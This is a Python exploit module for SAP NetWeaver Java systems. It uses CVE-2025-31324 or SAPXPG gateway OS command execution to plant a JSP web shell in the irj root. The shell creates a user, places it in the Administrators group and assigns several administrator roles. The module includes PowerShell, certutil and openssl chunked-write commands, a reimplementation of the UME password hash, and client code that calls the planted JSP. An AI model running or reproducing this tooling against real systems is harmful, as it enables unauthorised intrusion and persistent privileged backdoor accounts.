#!/usr/bin/env python3
"""
SAP UME (Java) user creation — both the password-hash primitive and the
JSP-based user-creation workflow.

Two independent exploit paths are supported, both ending at the same JSP that
uses `com.sap.security.api.UMFactory` via reflection:

  1. CVE-2025-31324: drop the JSP via the existing deserialisation webshell.
  2. GW RFC SAPXPG OS exec: write the JSP in chunked base64 via SAPXPG, then
     decode with `certutil.exe -decode` into the Java cluster's `irj/root/`.

The password hash is reimplemented locally (matches the server's
`com.sap.security.core.util.imp.PasswordHash` output) so hashes are portable
across SAP Java systems — the hash depends only on password+salt+iterations,
never on user or SID.
"""

from __future__ import annotations

import base64
import hashlib
import logging
import os
import random
import re
import secrets
import ssl
import string
import urllib.error
import urllib.parse
import urllib.request

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Password hash — local reimplementation of PasswordHash.hashWithIterations
# ---------------------------------------------------------------------------

def ume_password_hash(password: str,
                       salt: bytes = None,
                       algorithm: str = "SHA-256",
                       iterations: int = 10000,
                       salt_length: int = 24) -> str:
    """Return the UME-formatted password hash string `{ALG, ITER, SLEN}<b64>`.

    The algorithm is SHA-N applied to `password + previous_digest` (NOT
    `salt + previous_digest` like most PBKDF-style iterations).  Initial
    digest is SHA-N(password + salt).  Stored as base64(digest || salt).

    Args:
        password:    plaintext password
        salt:        explicit salt bytes (default: fresh random of salt_length)
        algorithm:   "SHA-256" or "SHA-512"
        iterations:  hash iterations (default matches SAP UME default: 10000)
        salt_length: random salt length in bytes (default 24)

    Returns a string like `{SHA-256, 10000, 24}<base64>` accepted by
    `UACC.PRIVATE_DATASOURCE.un:<user>` rows under the `j_password` attr.
    """
    if salt is None:
        salt = secrets.token_bytes(salt_length)

    pyname = algorithm.lower().replace("-", "")  # sha256 / sha512
    pwd_bytes = password.encode("utf-8")
    digest = hashlib.new(pyname, pwd_bytes + salt).digest()
    for _ in range(iterations - 1):
        digest = hashlib.new(pyname, pwd_bytes + digest).digest()

    encoded = base64.b64encode(digest + salt).decode("ascii")
    return f"{{{algorithm}, {iterations}, {len(salt)}}}{encoded}"


def ume_password_check(hash_str: str, password: str) -> bool:
    """Validate a plaintext password against a stored `{ALG,ITER,SLEN}<b64>` hash."""
    m = re.match(r"^\{([A-Za-z0-9\-]+)\s*,\s*(\d+)\s*,\s*(\d+)\}(.+)$", hash_str)
    if not m:
        return False
    algorithm = m.group(1)
    iterations = int(m.group(2))
    salt_length = int(m.group(3))
    blob = base64.b64decode(m.group(4))
    # blob layout: hash || salt.  Hash length = digest size of algorithm.
    try:
        digest_len = hashlib.new(algorithm.lower().replace("-", "")).digest_size
    except ValueError:
        return False
    stored_hash = blob[:digest_len]
    salt = blob[digest_len:digest_len + salt_length]
    recomputed = ume_password_hash(password, salt, algorithm, iterations, salt_length)
    # Compare raw hashes (constant time)
    expected = base64.b64decode(recomputed.split("}", 1)[1])[:digest_len]
    return secrets.compare_digest(expected, stored_hash)


# ---------------------------------------------------------------------------
# Create-user JSP template (uses UME API via reflection)
# ---------------------------------------------------------------------------

# Request params: user, pass, firstname, lastname, group (default: Administrators).
# Output is a simple `key=value` format so the caller can parse deterministically.
UME_CREATE_JSP = r'''<%@ page contentType="text/plain" %>
<%
String mode      = request.getParameter("mode");
String uname     = request.getParameter("user");
String pass      = request.getParameter("pass");
String firstname = request.getParameter("firstname");
String lastname  = request.getParameter("lastname");
String group     = request.getParameter("group");
if (uname == null || uname.length() == 0) {
    out.println("status=error"); out.println("error=missing-user"); return;
}
if (pass == null)      pass = "";
if (firstname == null) firstname = "SAPMAP";
if (lastname == null)  lastname = uname;
if (group == null)     group = "Administrators";
if (mode == null)      mode = "create";

try {
    Class<?> UMF = Class.forName("com.sap.security.api.UMFactory");
    Object uaf = UMF.getMethod("getUserAccountFactory").invoke(null);
    Object uf  = UMF.getMethod("getUserFactory").invoke(null);
    Object gf  = UMF.getMethod("getGroupFactory").invoke(null);

    // ---- verify mode: confirm (uname, pass) authenticates -------------------
    // Looks up the stored j_password hash for the account and asks the
    // server's PasswordHash.checkHash() to validate — this is what the
    // HTTP logon path does internally, so matching means real login works.
    if ("verify".equals(mode)) {
        try {
            Object acct = uaf.getClass()
                .getMethod("getUserAccountByLogonId", String.class)
                .invoke(uaf, uname);
            if (acct == null) { out.println("status=not_found"); return; }
            String[] vals = (String[]) acct.getClass()
                .getMethod("getAttribute", String.class, String.class)
                .invoke(acct, "com.sap.security.core.usermanagement", "j_password");
            if (vals == null || vals.length == 0 || vals[0] == null) {
                out.println("status=no_hash"); return;
            }
            String storedHash = vals[0];
            Class<?> PH = Class.forName("com.sap.security.core.util.imp.PasswordHash");
            java.lang.reflect.Constructor<?> c2 = null;
            for (java.lang.reflect.Constructor<?> c : PH.getDeclaredConstructors()) {
                if (c.getParameterTypes().length == 2) { c2 = c; c2.setAccessible(true); break; }
            }
            Object ph = c2.newInstance(uname, pass);
            boolean ok = (Boolean) PH.getMethod("checkHash", String.class)
                .invoke(ph, storedHash);
            out.println("status=" + (ok ? "ok" : "wrong_password"));
            out.println("userid=" + acct.getClass()
                .getMethod("getUniqueID").invoke(acct));
        } catch (Throwable vt) {
            Throwable vc = vt;
            while (vc.getCause() != null) vc = vc.getCause();
            if (vc.getClass().getSimpleName().contains("NoSuch") ||
                vc.getClass().getSimpleName().contains("NotFound")) {
                out.println("status=not_found");
            } else {
                out.println("status=error");
                out.println("error=" + vc.getClass().getSimpleName()
                    + ": " + vc.getMessage());
            }
        }
        return;
    }

    // Already exists?
    String userId = null;
    try {
        Object existing = uf.getClass()
            .getMethod("getUserByUniqueName", String.class).invoke(uf, uname);
        if (existing != null) {
            userId = (String) existing.getClass()
                .getMethod("getUniqueID").invoke(existing);
            out.println("status=exists");
            out.println("userid=" + userId);
        }
    } catch (java.lang.reflect.InvocationTargetException ite) {
        // NoSuchUserException -> fall through to create
    }

    if (userId == null) {
        Object userMaint = uf.getClass()
            .getMethod("newUser", String.class).invoke(uf, uname);
        userMaint.getClass().getMethod("setFirstName", String.class)
            .invoke(userMaint, firstname);
        userMaint.getClass().getMethod("setLastName", String.class)
            .invoke(userMaint, lastname);

        Object account = uaf.getClass()
            .getMethod("newUserAccount", String.class).invoke(uaf, uname);
        account.getClass().getMethod("setPassword", String.class)
            .invoke(account, pass);

        java.lang.reflect.Method commitUser = null;
        for (java.lang.reflect.Method m : uf.getClass().getMethods()) {
            if (m.getName().equals("commitUser") && m.getParameterTypes().length == 2) {
                commitUser = m; break;
            }
        }
        commitUser.invoke(uf, userMaint, account);
        userId = (String) userMaint.getClass()
            .getMethod("getUniqueID").invoke(userMaint);
        out.println("status=created");
        out.println("userid=" + userId);
    }

    // Add to group (idempotent — addUserToGroup on an existing member is a no-op)
    try {
        Object grp = gf.getClass()
            .getMethod("getGroupByUniqueName", String.class).invoke(gf, group);
        String groupId = (String) grp.getClass()
            .getMethod("getUniqueID").invoke(grp);
        gf.getClass().getMethod("addUserToGroup", String.class, String.class)
            .invoke(gf, userId, groupId);
        out.println("group=" + group);
        out.println("groupid=" + groupId);
    } catch (Throwable gt) {
        Throwable gc = gt;
        while (gc.getCause() != null) gc = gc.getCause();
        out.println("group_error=" + gc.getClass().getSimpleName() + ": " + gc.getMessage());
    }

    // Also assign the J2EE admin UME ROLES directly.  On many NW
    // installs, the "Administrators" UME group alone does NOT grant
    // NWA application access — the webdynpro framework checks for
    // specific role memberships (e.g. Administrator,
    // SAP_J2EE_ADMIN, SAP.LM.FullAdministrator).  We try each known
    // admin role name and record which ones were actually assignable
    // on this particular build.
    try {
        Object rf = UMF.getMethod("getRoleFactory").invoke(null);
        java.lang.reflect.Method getRoleByUniqueName =
            rf.getClass().getMethod("getRoleByUniqueName", String.class);
        java.lang.reflect.Method addUserToRole =
            rf.getClass().getMethod("addUserToRole",
                                      String.class, String.class);
        String[] adminRoles = {
            "Administrator",
            "administrator",
            "SAP_J2EE_ADMIN",
            "SAP.LM.FullAdministrator",
            "SAP.CI.FullAdministrator",
            "sap.com/tc~lm~webadmin~mainframe~permissions:NWA.Administrator",
        };
        StringBuilder added = new StringBuilder();
        StringBuilder skipped = new StringBuilder();
        for (String rn : adminRoles) {
            try {
                Object role = getRoleByUniqueName.invoke(rf, rn);
                if (role == null) {
                    if (skipped.length() > 0) skipped.append(",");
                    skipped.append(rn).append(":missing");
                    continue;
                }
                String roleId = (String) role.getClass()
                    .getMethod("getUniqueID").invoke(role);
                addUserToRole.invoke(rf, userId, roleId);
                if (added.length() > 0) added.append(",");
                added.append(rn);
            } catch (Throwable rt) {
                Throwable rc = rt;
                while (rc.getCause() != null) rc = rc.getCause();
                if (skipped.length() > 0) skipped.append(",");
                skipped.append(rn).append(":")
                    .append(rc.getClass().getSimpleName());
            }
        }
        if (added.length() > 0)   out.println("roles_added=" + added);
        if (skipped.length() > 0) out.println("roles_skipped=" + skipped);
    } catch (Throwable rootRt) {
        Throwable rc = rootRt;
        while (rc.getCause() != null) rc = rc.getCause();
        out.println("roles_error=" + rc.getClass().getSimpleName()
                     + ": " + rc.getMessage());
    }
} catch (Throwable t) {
    Throwable c = t;
    while (c.getCause() != null) c = c.getCause();
    out.println("status=error");
    out.println("error=" + c.getClass().getSimpleName() + ": " + c.getMessage());
}
%>'''


_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")


def _random_jsp_name(prefix: str = "ume") -> str:
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    return f"{prefix}{suffix}.jsp"


def _java_root_path(sid: str, instance_nr: int,
                      os_type: str = "windows") -> str:
    """Canonical path of the `irj/root/` web-app directory.

    Picks backslash-rooted `C:\\usr\\sap\\…` for Windows or
    forward-slash-rooted `/usr/sap/…` for Unix-family OSes.
    """
    inst = f"J{int(instance_nr):02d}"
    if os_type.lower().startswith(("lin", "unix", "aix", "hp-ux",
                                      "sol", "sunos")):
        return (f"/usr/sap/{sid}/{inst}/j2ee/cluster/apps/"
                f"sap.com/irj/servlet_jsp/irj/root")
    return (f"C:\\usr\\sap\\{sid}\\{inst}\\j2ee\\cluster\\apps\\"
            f"sap.com\\irj\\servlet_jsp\\irj\\root")


def _is_linux_target(node) -> bool:
    ot = (getattr(node, "os_type", "") or "").upper()
    return any(k in ot for k in ("LINUX", "UNIX", "AIX", "HP-UX",
                                    "SUNOS", "SOLARIS"))


# ---------------------------------------------------------------------------
# JSP invocation (common to both deployment paths)
# ---------------------------------------------------------------------------

def verify_user_logon(jsp_url: str, username: str, password: str,
                       timeout: float = 15.0) -> dict:
    """Ask the deployed JSP to validate (username, password) against the
    stored UME hash — equivalent to checking whether a real HTTP login
    would succeed, without actually touching the login flow.

    Returns dict: {success, status, userid, error}.
      status == "ok"             → credentials match
      status == "wrong_password" → user exists, password is different
      status == "not_found"      → no such user
    """
    params = {"mode": "verify", "user": username, "pass": password}
    qs = urllib.parse.urlencode(params)
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(f"{jsp_url}?{qs}",
                                   headers={"User-Agent": _UA})
    result = {"success": False, "status": "", "userid": "", "error": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        result["error"] = f"HTTP {e.code}"
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        k = k.strip().lower()
        v = v.strip()
        if k in result:
            result[k] = v
    result["success"] = result["status"] == "ok"
    return result


def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
                             firstname: str = "SAPMAP", lastname: str = None,
                             group: str = "Administrators",
                             timeout: float = 25.0) -> dict:
    """Call the deployed create-user JSP and parse the key=value response.

    Returns dict with keys: success, status, userid, group, groupid, error.
    """
    params = {"user": username, "pass": password, "firstname": firstname,
              "lastname": lastname or username, "group": group}
    qs = urllib.parse.urlencode(params)
    url = f"{jsp_url}?{qs}"
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": _UA})
    result = {"success": False, "status": "", "userid": "",
              "group": "", "groupid": "", "error": "", "raw": "",
              "http_status": 0, "body_len": 0,
              "roles_added": "", "roles_skipped": "", "roles_error": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
            result["http_status"] = r.status
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        result["error"] = f"HTTP {e.code}"
        result["http_status"] = e.code
        result["raw"] = text[:500]
        result["body_len"] = len(text)
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result

    result["raw"] = text
    result["body_len"] = len(text)
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        k = k.strip().lower()
        v = v.strip()
        if k in result:
            result[k] = v
    result["success"] = result["status"] in ("created", "exists")
    # Surface something useful if the JSP responded but with no
    # parseable status=… line.  Common causes: JSP was deployed to
    # the wrong instance's root; the file we wrote was a truncated/
    # garbled JSP source that rendered as empty; or the web tier is
    # caching a stale response.
    if not result["success"] and not result["error"]:
        if result["body_len"] == 0:
            result["error"] = (f"HTTP {result['http_status']} with empty "
                                f"body — the JSP URL is reachable but "
                                f"produced no output (likely deployed to "
                                f"the wrong Java instance, or the written "
                                f"file is not valid JSP).")
        else:
            result["error"] = (f"HTTP {result['http_status']} with "
                                f"{result['body_len']}-byte body but no "
                                f"status=… line parsed — "
                                f"body starts with: "
                                f"{text[:160]!r}")
    return result


# ---------------------------------------------------------------------------
# Deployment path 1: via CVE-2025-31324 (existing dropshell)
# ---------------------------------------------------------------------------

def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
    """Drop the create-user JSP via CVE-2025-31324 command-write.

    `writer_fn` is a callable that takes a single shell-command string and
    executes it on the target (typically
    `sapmap_exploit.execute_cve_2025_31324_via_shell` or a wrapper).

    Returns dict: {success, jsp_url, jsp_name, error}.
    """
    sid = node.sid
    port = getattr(node, "cve_2025_31324_port", 0)
    if not port or port < 50000:
        return {"success": False, "error": "no Java HTTP port known"}
    inst_nr = (port - 50000) // 100
    jsp_name = _random_jsp_name("ume")
    target_path = _java_root_path(sid, inst_nr) + "\\" + jsp_name
    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")

    ps_cmd = (f"[IO.File]::WriteAllBytes('{target_path}',"
              f"[Convert]::FromBase64String('{jsp_b64}'))")
    full = f"powershell.exe -NoProfile -Command {ps_cmd}"
    try:
        r = writer_fn(full)
    except Exception as e:
        return {"success": False, "error": f"writer failed: {e}"}
    if not r.get("success"):
        return {"success": False, "error": r.get("error", "write failed")}

    scheme = "https" if getattr(node, "cve_2025_31324_https", False) else "http"
    host = node.ip or node.hostname
    jsp_url = f"{scheme}://{host}:{port}/irj/{jsp_name}"
    return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
            "target_path": target_path, "method": "cve_31324"}


# ---------------------------------------------------------------------------
# Deployment path 2: via GW RFC SAPXPG OS exec (chunked)
# ---------------------------------------------------------------------------

def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                                    chunk_size: int = 100) -> dict:
    """Drop the create-user JSP via SAPXPG gateway OS exec.

    Gateway SAPXPG has 128-byte EXTPROG / 255-byte PARAMS limits, so a
    ~3 KB JSP must be written in chunks.  We base64-encode the JSP,
    stream chunks to a temp file via `cmd.exe /C echo` (Windows) or
    `/bin/sh -c "echo"` (Linux), then decode with `certutil -decode` /
    `base64 -d` into `irj/root/<name>.jsp`.

    `exec_fn` is a callable that takes `(command, params)` and runs them
    through `sapmap_exploit.execute_gw_command`.  Returns the same dict
    shape as the CVE path.
    """
    sid = node.sid
    jsp_name = _random_jsp_name("ume")
    linux = _is_linux_target(node)
    os_label = "linux" if linux else "windows"
    target_path = (_java_root_path(sid, java_instance_nr, os_label)
                   + ("/" if linux else "\\") + jsp_name)

    import random as _r
    import string as _s
    suffix = "".join(_r.choice(_s.ascii_lowercase) for _ in range(6))

    if linux:
        # SAPXPG PARAMS on some kernels (e.g. SJ1) does a raw
        # whitespace split AND keeps quote chars as literals, so
        # `/bin/sh -c "..."` and `/bin/sh -c '...'` both fail with
        # unbalanced quotes.  Avoid shell entirely and use programs
        # whose argv is naturally space-tokenised:
        #
        #   chunks  -> python3 -c open('/tmp/…','ab').write(b'CHUNK')
        #     Python script is a single token (no spaces).  Base64
        #     chunks are [A-Za-z0-9+/=] so they never break the
        #     b'...' literal.
        #   decode  -> /usr/bin/openssl enc -d -base64 -A -in I -out O
        #     -A is critical: without it openssl expects PEM-style line
        #     breaks every 64 chars and silently outputs 0 bytes for a
        #     single-line base64 blob (which is what our chunk loop
        #     produces).  With -A single-line input is accepted.
        #   cleanup -> /bin/rm -f FILE
        chunk_shell = "python3"
        decode_shell = "/usr/bin/openssl"
        cleanup_shell = "/bin/rm"
        tmp_b64 = f"/tmp/sapmap_ume_{suffix}.b64"

        def echo_args(chunk, op):
            mode = "wb" if op == ">" else "ab"
            return f"-c open('{tmp_b64}','{mode}').write(b'{chunk}')"

        # SAPXPG's PARAMS field is 255 bytes; larger payloads get
        # silently truncated, chopping the chunk mid b'...' literal
        # and producing a Python SyntaxError.  Pick a chunk_size so
        # the full wrapped command stays under 255 bytes with a
        # 10-byte safety margin.
        _wrapper = echo_args("", ">>")
        chunk_size = max(40, 255 - len(_wrapper) - 10)

        decode_args = (f"enc -d -base64 -A -in {tmp_b64} "
                        f"-out {target_path}")
        cleanup_args = f"-f {tmp_b64}"
    else:
        chunk_shell = "cmd.exe"
        decode_shell = "cmd.exe"
        cleanup_shell = "cmd.exe"
        tmp_b64 = r"%TEMP%\sapmap_ume.b64"

        def echo_args(chunk, op):
            return f"/C echo {chunk}{op}{tmp_b64}"

        decode_args = (f'/C certutil.exe -decode {tmp_b64} '
                        f'"{target_path}"')
        cleanup_args = f"/C del /q {tmp_b64} 2>nul"

    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")
    chunks = [jsp_b64[i:i + chunk_size]
              for i in range(0, len(jsp_b64), chunk_size)]

    # 0a) Preflight: on Linux confirm python3 is reachable.  If not,
    # we'd silently waste ~40 RFC calls and then fail at decode.
    if linux:
        probe = exec_fn(chunk_shell, "--version")
        probe_out = " ".join(str(l) for l in
                                (probe.get("output") or [])).strip()
        if not probe.get("success") or not probe_out:
            return {"success": False,
                    "error": (f"{chunk_shell} preflight failed on target "
                              f"(output: {probe_out[:200] or '<empty>'}, "
                              f"err: {probe.get('error', '?')}) — python3 "
                              f"may not be in PATH for the gateway user.")}
        print(f"[+] {node.sid}: preflight OK: {probe_out[:200]}")

    # 0) Clean up any prior leftover
    try:
        exec_fn(cleanup_shell, cleanup_args)
    except Exception:
        pass

    # 1) Stream base64 chunks.  Surface the first chunk's stdout/stderr
    # so silent failures (e.g. `python3 not in PATH`) show up before we
    # spend minutes writing 40 useless chunks.
    if linux:
        # Print the exact first-chunk command so we can eyeball truncation
        _first = echo_args(chunks[0], ">")
        _first_display = (_first if len(_first) <= 160
                           else _first[:160] + "…")
        print(f"[*] {node.sid}: first-chunk command "
              f"({len(_first)}B, limit 255): {_first_display}")
    import time as _time
    print(f"[*] {node.sid}: chunk loop starting: {len(chunks)} chunks × "
          f"{chunk_size}B base64 = {len(jsp_b64)} bytes total "
          f"(JSP source: {len(UME_CREATE_JSP)} bytes)")
    loop_start = _time.monotonic()
    for idx, chunk in enumerate(chunks):
        op = ">" if idx == 0 else ">>"
        t_start = _time.monotonic()
        r = exec_fn(chunk_shell, echo_args(chunk, op))
        t_elapsed = _time.monotonic() - t_start
        if not r.get("success"):
            return {"success": False,
                    "error": f"chunk {idx+1}/{len(chunks)} write failed: "
                             f"{r.get('error', '?')}"}
        if idx == 0:
            out = " ".join(str(l) for l in (r.get("output") or [])).strip()
            if out:
                print(f"[*] {node.sid}: first-chunk stdout/stderr: "
                      f"{out[:300]}")
            else:
                print(f"[*] {node.sid}: first-chunk stdout/stderr: "
                      f"<empty — {chunk_shell} ran silently>")
            # Did the first chunk actually land on disk?
            if linux:
                st = exec_fn("/usr/bin/stat",
                               f"-c %s {tmp_b64}")
                st_out = " ".join(str(l) for l in
                                    (st.get("output") or [])).strip()
                print(f"[*] {node.sid}: first-chunk tmp size: "
                      f"{tmp_b64} -> {st_out or '<no output>'}")
                try:
                    if int(st_out or "0") == 0:
                        return {"success": False,
                                "error": (f"first chunk wrote 0 bytes to "
                                           f"{tmp_b64} — python3 open()/"
                                           f"write() is silently failing "
                                           f"(possibly permission denied, "
                                           f"or SAPXPG is tokenising the "
                                           f"script differently than we "
                                           f"expect).  The chunk command "
                                           f"was: {_first!r}")}
                except ValueError:
                    pass
        # Per-chunk verbose progress with running ETA + bar.
        chunk_n = idx + 1
        pct = int(chunk_n * 100 / len(chunks))
        elapsed = _time.monotonic() - loop_start
        avg = elapsed / chunk_n
        remaining = int(avg * (len(chunks) - chunk_n))
        bar_w = 20
        filled = int(pct * bar_w / 100)
        bar = "#" * filled + "·" * (bar_w - filled)
        print(f"[*] {node.sid}: chunk {chunk_n:>3}/{len(chunks)} "
              f"[{bar}] {pct:>3}%  "
              f"(+{int(t_elapsed*1000):>4} ms, "
              f"total {int(elapsed):>3}s, ETA {remaining:>2}s)")
    total = _time.monotonic() - loop_start
    print(f"[+] {node.sid}: chunk loop done: {len(chunks)} chunks / "
          f"{len(jsp_b64)} base64 B in {total:.1f}s "
          f"({len(jsp_b64)/total/1024:.1f} KB/s)")

    # 1b) Post-loop tmp-file size check — confirms every chunk actually
    # appended.  Expected: exactly len(jsp_b64).  Anything less means
    # later chunks didn't write (maybe 'ab' mode has a silent issue on
    # this kernel).
    if linux:
        st_tmp = exec_fn("/usr/bin/stat", f"-c %s {tmp_b64}")
        st_tmp_out = " ".join(str(l) for l in
                                (st_tmp.get("output") or [])).strip()
        expected = str(len(jsp_b64))
        print(f"[*] {node.sid}: tmp-file size after chunks: "
              f"{tmp_b64} -> {st_tmp_out or '<no output>'} "
              f"(expected {expected})")
        if st_tmp_out and not st_tmp_out.startswith(expected):
            print(f"[!] {node.sid}: tmp file size mismatch — chunks "
                  f"may have been truncated or lost")

    # 2) Decode to target JSP.  On Windows the /C wrapper is important
    #    so %TEMP% in the source path expands (SAPXPG does not resolve
    #    environment variables when invoking certutil directly).
    #    On Linux we use openssl with argv-only I/O (no shell).
    print(f"[*] {node.sid}: decoding {tmp_b64} → {target_path} "
          f"via {decode_shell}")
    r = exec_fn(decode_shell, decode_args)
    dec_out = " ".join(str(l) for l in (r.get("output") or [])).strip()
    print(f"[*] {node.sid}: decode stdout/stderr "
          f"({len(dec_out)}B): {dec_out[:400] or '<empty>'}")
    if not r.get("success"):
        return {"success": False,
                "error": f"decode step failed: {r.get('error', '?')}"}
    # Verify decode actually wrote the file (the shell returns success
    # exit code even on some file errors; stdout lines tell us more)
    out_text = dec_out
    low = out_text.lower()
    for marker in ("failed", "error", "no such file",
                     "can't exec external program", "exit code 1",
                     "unable to load"):
        if marker in low:
            return {"success": False,
                    "error": f"decode reported error: {out_text[:200]}"}

    # 3) Clean up the tmp base64 file
    try:
        exec_fn(cleanup_shell, cleanup_args)
    except Exception:
        pass

    # Post-deploy sanity: ask the target for the JSP file's size.  An
    # empty file or 'stat' failure means the decode didn't actually
    # land content where we expected (often because the irj root for
    # this instance lives elsewhere or is mounted from a shared path).
    if linux:
        st = exec_fn("/usr/bin/stat", f"-c %s {target_path}")
        st_out = " ".join(str(l) for l in
                            (st.get("output") or [])).strip()
        print(f"[*] {node.sid}: post-deploy size check: "
              f"{target_path} -> {st_out or '<no output>'}")

    # Determine JSP URL — caller supplies the Java HTTP port
    port = 50000 + java_instance_nr * 100
    host = node.ip or node.hostname
    jsp_url = f"http://{host}:{port}/irj/{jsp_name}"
    return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
            "target_path": target_path, "method": "gw_os_exec",
            "chunks_written": len(chunks)}
